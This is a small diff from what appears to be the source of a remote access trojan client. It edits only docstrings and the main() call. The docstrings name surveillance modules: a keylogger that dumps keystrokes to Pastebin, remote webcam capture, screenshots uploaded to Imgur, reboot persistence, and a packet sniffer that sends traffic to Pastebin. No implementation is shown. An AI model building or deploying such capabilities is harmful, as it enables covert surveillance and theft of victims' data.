@@ -967,7 +967,7 @@ class Client(object):
     def cd(self, *x): """usage:\t\tcd <path>\ndescription:\tchange directory""" return self._cd(*x)
 
     @_command
-    def set(self, x): """usage:\t\tset <module>\ndescription:\tset module option [option]=[value]""" return self._set(x)
+    def set(self, x): """usage:\t\tset <module> [option]=[value]\ndescription:\tset module options""" return self._set(x)
 
     @_command
     def ls(self, *x): """usage:\t\tls <path>\ndescription:\tlist directory contents""" return self._ls(*x)
@@ -1024,16 +1024,16 @@ class Client(object):
     def webcam(self): """usage:\t\twebcam\ndescription:\tremote image/video capture from client webcam""" return self._webcam()
     
     @_module
-    def keylogger(self): """usage:\t\tkeylogger\ndescription:\tlog client keystrokes remotely + dump to Pastebin""" return self._keylogger()
+    def keylogger(self): """usage:\t\tkeylogger\ndescription:\tlog client keystrokes remotely and dump to pastebin""" return self._keylogger()
 
     @_module
-    def screenshot(self): """usage:\t\tscreenshot\ndescription:\ttake screenshot + upload to Imgur""" return self._screenshot()
+    def screenshot(self): """usage:\t\tscreenshot\ndescription:\ttake screenshot + upload to imgur""" return self._screenshot()
 
     @_module
     def persistence(self): """usage:\t\tpersistence\ndescription:\testablish persistence to relaunch on reboot""" return self._persistence()
     
     @_module
-    def packetsniffer(self): """usage:\t\tpacketsniffer\ndescription:\tcapture client network traffic + dump to Pastebin""" return self._packetsniffer()
+    def packetsniffer(self): """usage:\t\tpacketsniffer\ndescription:\tcapture client network traffic and dump to pastebin""" return self._packetsniffer()
 
 # -----------------   main   --------------------------
 
@@ -1042,6 +1042,6 @@ def main(*args, **kwargs):
     return client.start()
 
 if __name__ == '__main__':
-    main(**config)
+    main()
 
 
